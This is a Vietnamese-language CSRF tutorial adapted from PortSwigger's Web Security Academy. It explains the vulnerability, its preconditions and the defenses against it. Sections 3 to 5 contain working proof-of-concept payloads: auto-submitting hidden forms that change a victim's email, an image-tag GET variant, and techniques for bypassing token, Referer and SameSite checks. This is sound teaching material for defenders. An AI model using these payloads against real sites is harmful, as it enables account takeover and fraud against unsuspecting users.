# Giả mạo yêu cầu từ phía máy khách (Cross-Site Request Forgery - CSRF)

> **Cre:** [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)

---

## 1. Lỗ hổng CSRF là gì?

### 1.1. Định nghĩa
**Cross-Site Request Forgery (CSRF)** — hay còn gọi là **Giả mạo yêu cầu qua nhiều trang web** hoặc **Tấn công bằng một cú click chuột (One-click attack)** — là một lỗ hổng an ninh web cho phép kẻ tấn công lừa một người dùng đã đăng nhập (nạn nhân) vô tình thực hiện các hành động mà họ không hề mong muốn trên một ứng dụng web đáng tin cậy.

Về bản chất, CSRF khai thác cơ chế hoạt động mặc định của trình duyệt: **Trình duyệt luôn tự động gửi kèm cookie xác thực (Session Cookie) của trang đích mỗi khi gửi bất kỳ HTTP request nào đến trang đó**, bất kể request đó xuất phát từ đâu.

```
+-----------------------------------------------------------------------------------+
|                            SO SÁNH BẢN CHẤT XSS VS CSRF                           |
+-----------------------------------------------------------------------------------+
|  Cross-Site Scripting  | Kẻ tấn công tiêm mã JavaScript độc hại CHẠY TRÊN TRANG    |
|  (XSS)                 | mục tiêu -> Đọc dữ liệu, cướp Token/Cookie của nạn nhân.  |
+------------------------+----------------------------------------------------------+
|  Cross-Site Request    | Kẻ tấn công KHÔNG đọc được dữ liệu/cookie của nạn nhân,   |
|  Forgery (CSRF)        | nhưng MƯỢN ĐƯỢC QUYỀN HẠN của nạn nhân để kích hoạt       |
|                        | một hành động bất hợp pháp trên trang mục tiêu.           |
+-----------------------------------------------------------------------------------+
```

### 1.2. Mức độ tác động (Impact of CSRF)
Khi một cuộc tấn công CSRF thành công, kẻ tấn công có thể ép nạn nhân thực hiện các hành vi nguy hiểm tùy theo chức năng của ứng dụng:
*   **Chiếm đoạt tài khoản (Account Takeover):** Âm thầm đổi địa chỉ email hoặc mật khẩu của tài khoản sang thông tin của kẻ tấn công, sau đó dùng tính năng "Quên mật khẩu" để reset tài khoản.
*   **Gian lận tài chính (Financial Fraud):** Kích hoạt lệnh chuyển tiền từ tài khoản ngân hàng của nạn nhân sang tài khoản kẻ tấn công.
*   **Mua sắm gian lận:** Tự động đặt mua hàng hoặc thay đổi địa chỉ giao hàng trong tài khoản thương mại điện tử.
*   **Leo thang đặc quyền hệ thống:** Nếu nạn nhân là Quản trị viên (Admin), CSRF có thể tạo thêm tài khoản admin mới, cấu hình lại hệ thống hoặc xóa sạch cơ sở dữ liệu.

---

## 2. Ba điều kiện tiên quyết để xảy ra CSRF

Để một cuộc tấn công CSRF có thể thực hiện thành công, ứng dụng web mục tiêu bắt buộc phải thỏa mãn đồng thời **3 điều kiện**:

```
+----------------------------------------------------------------------------------------+
|                         3 ĐIỀU KIỆN TIÊN QUYẾT ĐỂ XẢY RA CSRF                         |
+----------------------------------------------------------------------------------------+
| 1. Hành động có giá trị (A relevant action): Chức năng thay đổi dữ liệu nhạy cảm.     |
| 2. Nhận diện phiên bằng Cookie (Cookie-based session): Dùng cookie để duy trì phiên.   |
| 3. Không có tham số khó đoán (No unpredictable parameters): Request dễ dàng bị dự đoán.|
+----------------------------------------------------------------------------------------+
```

1.  **Một hành động có giá trị (A relevant action):** 
    Ứng dụng phải có một chức năng quan trọng mà kẻ tấn công muốn kích hoạt (ví dụ: đổi mật khẩu, đổi email, cập nhật quyền, chuyển tiền).
2.  **Nhận diện phiên hoàn toàn dựa vào Cookie (Cookie-based session handling):** 
    Ứng dụng chỉ dựa vào Cookie trong HTTP Header (`Cookie: session=...`) để xác định người gửi request là ai. Ứng dụng không sử dụng thêm cơ chế xác thực kép nào khác (như Authorization Bearer Token độc lập hoặc nhập lại mật khẩu).
3.  **Không có tham số yêu cầu nào khó đoán (No unpredictable request parameters):** 
    Tất cả các tham số truyền trong request đều có thể đoán trước hoặc do kẻ tấn công tự chỉ định. Không có giá trị bí mật ngẫu nhiên nào (như CSRF Token) mà kẻ tấn công không biết.

---

## 3. Cách thức xây dựng một cuộc tấn công CSRF (CSRF PoC)

### 3.1. Kịch bản mẫu
*   **Chức năng mục tiêu:** Đổi email tài khoản tại trang web `https://vulnerable-website.com`.
*   **Gói tin HTTP hợp lệ do người dùng gửi đi khi đổi email:**
    ```http
    POST /my-account/change-email HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30
    Cookie: session=2p7Q4z9u8w1e4r5t6y7u8i9o0p

    email=attacker@evil-user.net
    ```

### 3.2. Mã khai thác HTML (CSRF Proof of Concept - PoC)
Kẻ tấn công tạo một trang web độc hại tại địa chỉ `https://attacker-website.com` chứa đoạn mã HTML/JavaScript sau và dụ nạn nhân truy cập vào:

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>Trang web trúng thưởng iPhone 16!</h1>
    
    <!-- Form độc hại ngầm gửi request đổi email -->
    <form id="csrfForm" action="https://vulnerable-website.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.com" />
    </form>

    <!-- Tự động submit form ngay khi trang web tải xong -->
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```

#### 🔍 Bảng giải thích chi tiết từng thành phần Payload CSRF:

| Thành phần | Ý nghĩa & Cơ chế hoạt động chi tiết |
| :--- | :--- |
| `<form action="https://vulnerable-website.com/..." method="POST">` | **Biểu mẫu gửi yêu cầu xuyên trang (Cross-site Form):** Thiết lập đích đến là endpoint đổi email của trang web bị lỗi với phương thức `POST`. Trình duyệt cho phép gửi form chéo domain mà không bị chặn bởi SOP (Same-Origin Policy). |
| `<input type="hidden" name="email" value="pwned@attacker.com" />` | **Dữ liệu giả mạo ngầm:** Trường dữ liệu ẩn chứa tham số `email` với giá trị là email của kẻ tấn công. Người dùng không nhìn thấy trường này trên màn hình. |
| `<script>document.getElementById('csrfForm').submit();</script>` | **Bộ kích hoạt tự động (Auto-submitter):** Mã JavaScript tự động kích hoạt sự kiện gửi form ngay khi nạn nhân tải trang, khiến cuộc tấn công diễn ra tức thì trong tích tắc mà không cần nạn nhân bấm nút gì. |
| *(Cơ chế trình duyệt tự đính kèm)* `Cookie: session=...` | **Vũ khí tự động của trình duyệt:** Khi form gửi request đến `vulnerable-website.com`, trình duyệt thấy nạn nhân đã đăng nhập từ trước nên **tự động lục kho cookie và đính kèm Session Cookie hợp lệ của nạn nhân** vào request. Server nhận được request hợp lệ và thực hiện đổi email ngay lập tức! |

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) *(Độ khó: APPRENTICE)*

---

## 4. Các cơ chế phòng thủ CSRF bị lỗi & Kỹ thuật Bypass

Nhiều nhà phát triển cố gắng triển khai các biện pháp chống CSRF nhưng mắc phải các sai sót logic nghiêm trọng, cho phép kẻ tấn công dễ dàng vượt qua:

---

### 4.1. Lỗi 1: Kiểm tra CSRF Token phụ thuộc vào Phương thức HTTP (Method-based Bypass)
Ứng dụng kiểm tra CSRF token rất nghiêm ngặt đối với request `POST`, nhưng lại **bỏ qua việc kiểm tra token nếu request chuyển sang phương thức `GET`**.

*   **Cách khai thác:** Chuyển đổi phương thức của form từ `POST` sang `GET`:
    ```html
    <form action="https://vulnerable-website.com/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="pwned@attacker.com" />
    </form>
    <script>document.forms[0].submit();</script>
    ```
    Hoặc dùng một thẻ ảnh đơn giản để kích hoạt:
    ```html
    <img src="https://vulnerable-website.com/my-account/change-email?email=pwned@attacker.com">
    ```
*   🧪 **Lab:** [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method) *(Độ khó: APPRENTICE)*

---

### 4.2. Lỗi 2: Kiểm tra CSRF Token phụ thuộc vào sự tồn tại của Token (Token Presence Bypass)
Server chỉ kiểm tra tính hợp lệ của token **khi request có gửi kèm tham số `csrf`**. Nếu request hoàn toàn **không có tham số `csrf`**, đoạn code kiểm tra bị bỏ qua và server vẫn xử lý yêu cầu bình thường!

*   **Cách khai thác:** Đơn giản là tạo form HTML và **xóa bỏ hoàn toàn** trường input chứa CSRF token:
    ```html
    <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.com" />
      <!-- KHÔNG CHÈN INPUT CSRF VÀO ĐÂY -->
    </form>
    <script>document.forms[0].submit();</script>
    ```
*   🧪 **Lab:** [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present) *(Độ khó: APPRENTICE)*

---

### 4.3. Lỗi 3: CSRF Token không được liên kết với Phiên người dùng (Token Pool Flaw)
Ứng dụng có tạo CSRF token và kiểm tra token có nằm trong danh sách token hợp lệ hay không, nhưng lại **không kiểm tra xem token đó có thuộc về chính người dùng đang gửi request hay không**.

*   **Cách khai thác:**
    1. Kẻ tấn công đăng nhập bằng tài khoản của chính mình (`attacker`), bắt một request để lấy một CSRF token hợp lệ của kẻ tấn công (ví dụ: `csrf=TOKEN_CỦA_HACKER`).
    2. Kẻ tấn công nhúng token này vào form mã độc gửi cho nạn nhân:
       ```html
       <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
         <input type="hidden" name="email" value="pwned@attacker.com" />
         <input type="hidden" name="csrf" value="TOKEN_CỦA_HACKER" />
       </form>
       <script>document.forms[0].submit();</script>
       ```
    3. Khi nạn nhân gửi form, server kiểm tra thấy `TOKEN_CỦA_HACKER` là token hợp lệ có trong hệ thống nên cho phép thực thi, trong khi phiên làm việc lại là của nạn nhân!
*   🧪 **Lab:** [CSRF where token is not tied to the user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session) *(Độ khó: PRACTITIONER)*

---

### 4.4. Lỗi 4: CSRF Token liên kết với một Cookie không phải Session (Cookie Jar / Token Cookie)
Ứng dụng kiểm tra token trong form khớp với một cookie mang tên `csrfKey`, nhưng cookie này lại **hoàn toàn độc lập** với cookie `session` xác thực người dùng.

*   **Cách khai thác (Kết hợp Cookie Injection / CRLF):**
    1. Kẻ tấn công lấy cặp `csrfKey=COOKIE_CỦA_HACKER` và giá trị `csrf=TOKEN_CỦA_HACKER` từ tài khoản của mình.
    2. Tìm một chức năng phụ trên trang web có lỗ hổng cho phép tiêm cookie vào trình duyệt nạn nhân (thường là chức năng tìm kiếm phản hồi header `Set-Cookie: LastSearchTerm=...`).
    3. Nhồi cookie `csrfKey` của hacker vào trình duyệt nạn nhân, sau đó gửi form CSRF chứa token tương ứng.
*   🧪 **Lab:** [CSRF where token is tied to a non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie) *(Độ khó: PRACTITIONER)*

---

### 4.5. Lỗi 5: Nhân bản Token vào Cookie (Double Submit Cookie Flaw)
Ứng dụng không lưu token trên server mà áp dụng kỹ thuật Double Submit: server chỉ so sánh xem giá trị tham số `csrf` trong form có **bằng y hệt** giá trị cookie `csrf` gửi lên hay không.

*   **Cách khai thác:**
    1. Lợi dụng một lỗi tiêm Cookie trên bất kỳ subdomain nào của trang web để ghi đè cookie `csrf=fake_token` vào trình duyệt nạn nhân.
    2. Tạo form CSRF gửi tham số `csrf=fake_token`.
    3. Khi form submit, cả hai giá trị đều là `fake_token`, server thấy hai bên khớp nhau nên xác thực thành công.
*   🧪 **Lab:** [CSRF where token is simply duplicated in a cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie) *(Độ khó: PRACTITIONER)*

---

### 4.6. Lỗi 6: Kiểm tra nguồn gốc bằng Header `Referer` bị lỗi (Referer-based Defense Flaws)
Ứng dụng kiểm tra header `Referer` để xác nhận request đến từ chính domain của hệ thống.

*   **Trường hợp 6A — Bỏ qua kiểm tra nếu không có Referer:**
    *   Ứng dụng chỉ chặn nếu `Referer` khác domain, nhưng nếu request **không có Referer** thì lại cho qua.
    *   *Khai thác:* Thêm thẻ meta `no-referrer` vào trang tấn công để trình duyệt giấu sạch header Referer khi gửi request:
        ```html
        <meta name="referrer" content="no-referrer">
        <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="pwned@attacker.com" />
        </form>
        <script>document.forms[0].submit();</script>
        ```
    *   🧪 **Lab:** [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present) *(Độ khó: PRACTITIONER)*

*   **Trường hợp 6B — Biểu thức chính quy (Regex) kiểm tra Referer bị lỏng lẻo:**
    *   Server chỉ kiểm tra xem chuỗi `vulnerable-website.com` có nằm ở đâu đó trong URL Referer hay không.
    *   *Khai thác:* Kẻ tấn công tạo domain hoặc đường dẫn chứa tên miền đó:
        ```text
        http://attacker.com/csrf.html?vulnerable-website.com
        hoặc
        http://vulnerable-website.com.attacker.com/csrf.html
        ```
    *   *Lưu ý trình duyệt hiện đại:* Trình duyệt thường cắt ngắn Referer chỉ còn Origin (`http://attacker.com/`). Kẻ tấn công cần đặt header hoặc thẻ meta `Referrer-Policy: unsafe-url` để ép trình duyệt gửi toàn bộ Query string chứa tên miền mục tiêu.
    *   🧪 **Lab:** [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken) *(Độ khó: PRACTITIONER)*

---

## 5. Thuộc tính Cookie `SameSite` & Tác động đến CSRF

Trình duyệt hiện đại đã bổ sung cơ chế bảo vệ mạnh mẽ thông qua thuộc tính **`SameSite`** trong HTTP Header `Set-Cookie`.

```
Set-Cookie: session=xyz123; SameSite=Strict; Secure; HttpOnly
```

### 5.1. Ba chế độ của `SameSite`:

| Chế độ | Hành vi gửi Cookie khi Cross-Site (Truy cập từ trang khác) | Mức độ chống CSRF |
| :--- | :--- | :---: |
| **`Strict`** | **Tuyệt đối không gửi cookie** trong mọi request bắt nguồn từ trang web khác (kể cả khi người dùng bấm vào một link thông thường `<a>`). | **100% Chống CSRF** |
| **`Lax`** | **Không gửi cookie** trong các request thay đổi trạng thái (POST, PUT, DELETE, iframe, ajax). **CHỈ GỬI COOKIE** đối với điều hướng cấp cao nhất (Top-level navigation) sử dụng phương thức **`GET`** (ví dụ bấm link `<a>`). | Chống được hầu hết CSRF dạng POST |
| **`None`** | Cookie được gửi trong **tất cả** các request xuyên trang (bắt buộc phải đi kèm cờ `Secure`). | Không chống được CSRF |

> 📌 **Cơ chế mặc định của Google Chrome:** Nếu lập trình viên không chỉ định thuộc tính `SameSite`, Chrome sẽ tự động coi là **`SameSite=Lax`**.

### 5.2. Kỹ thuật Bypass SameSite Lax

1.  **Chuyển đổi phương thức sang `GET`:** 
    Nếu chức năng nhạy cảm của backend chấp nhận cả phương thức `GET` (hoặc hỗ trợ tham số ghi đè phương thức `_method=POST`), kẻ tấn công có thể lừa nạn nhân bấm một liên kết thẻ `<a>` thông thường $\rightarrow$ Trình duyệt coi đây là Top-level navigation bằng `GET` nên sẽ gửi kèm Cookie `SameSite=Lax`!
2.  **Khoảng thời gian 2 phút "Lax + POST" (Lax-allowing-unsafe):**
    Chrome có một ngoại lệ: Đối với các cookie mới được thiết lập trong vòng **120 giây (2 phút)** đầu tiên mà không chỉ định `SameSite`, Chrome vẫn cho phép gửi cookie trong các request `POST` xuyên trang để tránh làm vỡ các luồng đăng nhập cũ (SSO).
3.  **Kết hợp với Client-side Redirect:**
    Nếu trên trang web mục tiêu có một endpoint chuyển hướng (Open Redirect), kẻ tấn công điều hướng nạn nhân từ trang ngoài vào endpoint đó bằng `GET` (kèm cookie), sau đó chính endpoint nội bộ đó kích hoạt request tới chức năng nhạy cảm.
*   🧪 **Lab:** [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override) *(Độ khó: PRACTITIONER)*

---

## 6. Cách phòng chống CSRF triệt để (How to Prevent CSRF)

Một hệ thống phòng thủ CSRF đạt chuẩn quốc tế phải áp dụng chiến lược đa tầng (Defense-in-Depth):

### 6.1. Sử dụng Anti-CSRF Token (Synchronizer Token Pattern) — *Chuẩn mực số 1*
Đây là biện pháp hiệu quả và phổ biến nhất:
*   Mỗi khi render một form thay đổi dữ liệu, server sinh ra một chuỗi ngẫu nhiên bí mật, độc nhất, có tính entropy cao và **gắn chặt với Session của người dùng hiện tại** trên server.
*   Token này được nhúng vào form dưới dạng một trường ẩn:
    ```html
    <input type="hidden" name="csrf_token" value="d41d8cd98f00b204e9800998ecf8427e">
    ```
*   Khi nhận request submit, server bắt buộc phải:
    1. Kiểm tra tham số token có tồn tại hay không.
    2. So sánh token nhận được với token được lưu trữ trong session của chính người dùng đó.
    3. Hủy bỏ token ngay sau khi sử dụng (One-time Token).
*   *Vì kẻ tấn công từ trang web bên ngoài không thể đọc được nội dung HTML của trang mục tiêu (do chính sách SOP), chúng không thể biết được giá trị CSRF Token hợp lệ để đưa vào form giả mạo.*

---

### 6.2. Thiết lập cờ `SameSite=Strict` hoặc `SameSite=Lax` cho Cookie
Cấu hình thuộc tính `SameSite` trên tất cả các cookie xác thực phiên làm việc:
```http
Set-Cookie: session=xyz123; Path=/; Secure; HttpOnly; SameSite=Lax
```
Đối với các hệ thống nhạy cảm cao (ngân hàng, thanh toán), hãy sử dụng `SameSite=Strict`.

---

### 6.3. Sử dụng Custom Request Headers kết hợp với API (REST / JSON)
Đối với các ứng dụng hiện đại (Single Page Application - React, Vue, Angular) giao tiếp với Backend qua API:
*   Frontend sử dụng JavaScript (`fetch`, `axios`) để đính kèm một custom header bí mật vào request:
    ```javascript
    fetch('/api/account/email', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': userCsrfToken
        },
        body: JSON.stringify({ email: 'new@example.com' })
    });
    ```
*   *Vì sao an toàn?* Trình duyệt không bao giờ cho phép một trang web từ domain khác tự ý gửi request có chứa các custom header lạ (như `X-CSRF-Token`) sang domain của bạn mà không kích hoạt **CORS Preflight (OPTIONS request)**. Nếu server không cho phép nguồn gốc đó qua CORS, request sẽ bị trình duyệt chặn đứng ngay lập tức.

---

### 6.4. Yêu cầu tái xác thực cho các hành động nhạy cảm (Re-authentication)
Đối với các thao tác đặc biệt quan trọng (đổi mật khẩu, đổi địa chỉ email chính, chuyển tiền, xóa tài khoản):
*   Bắt buộc người dùng phải **nhập lại mật khẩu hiện tại** hoặc **nhập mã xác thực 2 bước (OTP / 2FA)**.
*   Kẻ tấn công dù có kích hoạt được CSRF cũng không thể biết mật khẩu của nạn nhân để vượt qua bước kiểm tra này.

---

## 7. Danh mục các bài Lab CSRF trên PortSwigger (Lộ trình học)

| STT | Tên bài Lab | Dạng lỗ hổng | Cấp độ |
| :---: | :--- | :--- | :---: |
| 1 | CSRF vulnerability with no defenses | Không có cơ chế bảo vệ nào | Apprentice |
| 2 | CSRF where token validation depends on request method | Kiểm tra token phụ thuộc phương thức HTTP | Apprentice |
| 3 | CSRF where token validation depends on token being present | Bỏ qua kiểm tra khi không có tham số token | Apprentice |
| 4 | CSRF where token is not tied to the user session | Token không gắn chặt với phiên người dùng | Practitioner |
| 5 | CSRF where token is tied to a non-session cookie | Token gắn với cookie ngoài (Cookie injection) | Practitioner |
| 6 | CSRF where token is simply duplicated in a cookie | Token bị nhân bản trong cookie (Double Submit) | Practitioner |
| 7 | CSRF where Referer validation depends on header being present | Bỏ qua Referer khi dùng `no-referrer` | Practitioner |
| 8 | CSRF with broken Referer validation | Regex kiểm tra Referer lỏng lẻo | Practitioner |
| 9 | SameSite Lax bypass via method override | Vượt qua SameSite Lax bằng ghi đè phương thức | Practitioner |
| 10 | SameSite Strict bypass via client-side redirect | Vượt qua SameSite Strict bằng Open Redirect | Practitioner |

---
*Tài liệu học tập và thực hành bảo mật ứng dụng web - Biên soạn dựa trên tiêu chuẩn giáo trình PortSwigger Web Security Academy.*
